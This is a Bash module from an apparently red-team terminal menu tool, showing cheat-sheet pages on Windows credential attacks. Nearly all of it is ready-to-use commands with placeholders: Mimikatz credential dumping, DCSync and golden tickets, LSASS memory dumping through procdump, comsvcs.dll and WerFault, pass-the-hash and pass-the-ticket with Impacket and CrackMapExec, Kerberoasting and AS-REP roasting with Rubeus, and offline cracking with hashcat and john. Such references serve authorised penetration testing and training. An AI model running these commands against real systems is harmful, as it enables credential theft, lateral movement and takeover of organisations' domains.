#!/usr/bin/env bash
# modules/red/creds.sh

red_creds() {
    while true; do
        local c
        c=$(dialog --backtitle "$(backtitle)" \
            --title "  🔑 RED — Credentials  " \
            --menu "\n  Credential Attacks:\n" 18 65 5 \
            "1" "  🎭  Mimikatz — Credential dumping" \
            "2" "  🗝️   LSASS — Dump techniques" \
            "3" "  🔄  Pass-the-Hash / Pass-the-Ticket" \
            "4" "  ☕  Kerberoasting" \
            "5" "  🍯  AS-REP Roasting" \
            3>&1 1>&2 2>&3) || return 0
        case "$c" in
            1) _red_mimikatz ;;
            2) _red_lsass ;;
            3) _red_pth ;;
            4) _red_kerberoast ;;
            5) _red_asrep ;;
        esac
    done
}

_red_mimikatz() { show_page "Mimikatz — Credential Dumping" \
"═══════════════════════════════════════════════════════════════
  Mimikatz — Credential Dumping                        [RED]
═══════════════════════════════════════════════════════════════

  LOGON PASSWORDS (plaintext if available)
    mimikatz# sekurlsa::logonpasswords

  DUMP SAM (requires SYSTEM)
    mimikatz# lsadump::sam

  GET SECRETS
    mimikatz# lsadump::secrets

  DCSYNC (requires DA or Replication rights)
    mimikatz# lsadump::dcsync /user:<DOMAIN>\\<USER>
    mimikatz# lsadump::dcsync /all /csv

  PASS-THE-HASH (run as SYSTEM)
    mimikatz# sekurlsa::pth /user:<USER> \\
      /domain:<DOMAIN> /ntlm:<HASH> /run:cmd.exe

  PTH WITH AES KEYS
    mimikatz# sekurlsa::pth /user:<USER> \\
      /domain:<DOMAIN> /ntlm:<NTLM_HASH> \\
      /aes128:<AES128> /aes256:<AES256>

  KERBEROS TICKETS
    mimikatz# kerberos::list
    mimikatz# kerberos::list /export
    mimikatz# kerberos::ptt <TICKET.kirbi>  (pass-the-ticket)
    mimikatz# kerberos::purge

  GOLDEN TICKET
    mimikatz# kerberos::golden \\
      /user:<USER> /domain:<DOMAIN> \\
      /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> \\
      /ticket:golden.kirbi

  ONE-LINER (from shell)
    mimikatz.exe \"sekurlsa::logonpasswords\" exit
    mimikatz.exe \"lsadump::sam\" exit
    mimikatz.exe \"lsadump::secrets\" exit

  MORE INFO
    https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz"; }

_red_lsass() { show_page "LSASS Dump Techniques" \
"═══════════════════════════════════════════════════════════════
  LSASS Dump Techniques                                [RED]
═══════════════════════════════════════════════════════════════

  TASK MANAGER (GUI)
    1. Open Task Manager → Details
    2. Right-click lsass.exe → Create dump file
    3. Copy lsass.dmp to attacker machine

  PROCDUMP (Sysinternals)
    C:\> procdump.exe -accepteula -ma lsass.exe lsass.dmp

  COMSVCS.DLL (built-in, no tools needed)
    C:\> Get-Process lsass | select id   (get PID)
    C:\> rundll32.exe C:\\Windows\\System32\\comsvcs.dll \\
         MiniDump <PID> C:\\Windows\\Temp\\lsass.dmp full

  WERFAULT (alternate)
    C:\> C:\\Windows\\System32\\WerFault.exe \\
         -u -p <PID> -ip <PID> -s 65536

  SECRETSDUMP (remote, Impacket)
    # secretsdump.py <DOMAIN>/<USER>:<PASS>@<IP>
    # secretsdump.py -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<IP>

  ANALYZE DUMP (Mimikatz)
    mimikatz# sekurlsa::minidump lsass.dmp
    mimikatz# sekurlsa::logonpasswords

  ANALYZE DUMP (Pypykatz)
    # pip install pypykatz
    # pypykatz lsa minidump lsass.dmp"; }

_red_pth() { show_page "Pass-the-Hash & Pass-the-Ticket" \
"═══════════════════════════════════════════════════════════════
  Pass-the-Hash & Pass-the-Ticket                      [RED]
═══════════════════════════════════════════════════════════════

  PASS-THE-HASH — Mimikatz
    mimikatz# sekurlsa::pth \\
      /user:<USER> /domain:<DOMAIN> \\
      /ntlm:<NTLM_HASH> /run:cmd.exe

  PASS-THE-HASH — Impacket
    # wmiexec.py -hashes :<NTLM> <DOMAIN>/<USER>@<IP>
    # psexec.py -hashes :<NTLM> <DOMAIN>/<USER>@<IP>
    # smbexec.py -hashes :<NTLM> <DOMAIN>/<USER>@<IP>
    # secretsdump.py -hashes :<NTLM> <DOMAIN>/<USER>@<IP>

  PASS-THE-HASH — CrackMapExec
    # crackmapexec smb <IP> -u <USER> -H <NTLM_HASH>
    # crackmapexec smb <RANGE> -u Administrator \\
      -H <NTLM_HASH> --local-auth

  OVERPASS-THE-HASH (get TGT from hash)
    mimikatz# sekurlsa::pth \\
      /user:<USER> /domain:<DOMAIN> \\
      /ntlm:<NTLM_HASH> /run:\"klist\"

  PASS-THE-TICKET
    # Export ticket
    mimikatz# kerberos::list /export

    # Import ticket on attacker box
    mimikatz# kerberos::ptt <TICKET.kirbi>

    # Verify
    klist

    # Use ticket
    dir \\\\<TARGET>\\C\$

  PASS-THE-TICKET — Impacket
    # ticketer.py -nthash <KRBTGT_HASH> \\
      -domain-sid <SID> -domain <DOMAIN> <USER>
    # export KRB5CCNAME=<USER>.ccache
    # psexec.py -k -no-pass <DOMAIN>/<USER>@<TARGET>"; }

_red_kerberoast() { show_page "Kerberoasting" \
"═══════════════════════════════════════════════════════════════
  Kerberoasting                                        [RED]
═══════════════════════════════════════════════════════════════

  WHAT IS IT?
    Request service tickets (TGS) for accounts with SPNs.
    Tickets are encrypted with the service account password hash.
    Crack offline with Hashcat (-m 13100).

  FIND KERBEROASTABLE ACCOUNTS
    # Find SPNs (PowerShell)
    Get-ADUser -Filter {ServicePrincipalName -ne \"\$null\"} \\
      -Properties ServicePrincipalName | \\
      Select Name,ServicePrincipalName

    # LDAP query
    dsquery * -filter \"(&(objectClass=user)(servicePrincipalName=*))\" \\
      -attr samaccountname servicePrincipalName

    # Impacket
    GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>

  REQUEST + EXPORT TICKETS
    # PowerShell
    Add-Type -AssemblyName System.IdentityModel
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken \\
      -ArgumentList \"<SPN>\"
    klist

    # Invoke-Kerberoast (PowerSploit)
    Import-Module .\\PowerSploit.psd1
    Invoke-Kerberoast -OutputFormat Hashcat | Select Hash

    # Rubeus
    Rubeus.exe kerberoast /outfile:hashes.txt

    # Impacket (remote)
    GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request

  CRACK THE TICKET
    # hashcat -m 13100 hashes.txt rockyou.txt
    # john --format=krb5tgs hashes.txt --wordlist=rockyou.txt"; }

_red_asrep() { show_page "AS-REP Roasting" \
"═══════════════════════════════════════════════════════════════
  AS-REP Roasting                                      [RED]
═══════════════════════════════════════════════════════════════

  WHAT IS IT?
    Accounts with \"Do not require Kerberos preauthentication\"
    can have their AS-REP hash requested WITHOUT credentials.
    Crack offline with Hashcat (-m 18200).

  FIND VULNERABLE ACCOUNTS
    # PowerShell AD Module
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq \$true} \\
      -Properties DoesNotRequirePreAuth

    # LDAP query
    dsquery * -filter \\
      \"(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\"

  REQUEST AS-REP HASH
    # Impacket (no credentials needed)
    GetNPUsers.py <DOMAIN>/ -usersfile users.txt \\
      -format hashcat -dc-ip <DC_IP>

    # Impacket (with credentials, find all)
    GetNPUsers.py <DOMAIN>/<USER>:<PASS> \\
      -request -format hashcat -dc-ip <DC_IP>

    # Rubeus
    Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

    # PowerShell (manual)
    Add-Type -AssemblyName System.IdentityModel
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken \\
      -ArgumentList \"krbtgt/<DOMAIN>\"

  CRACK THE HASH
    # hashcat -m 18200 asrep.txt rockyou.txt
    # john --format=krb5asrep asrep.txt --wordlist=rockyou.txt"; }
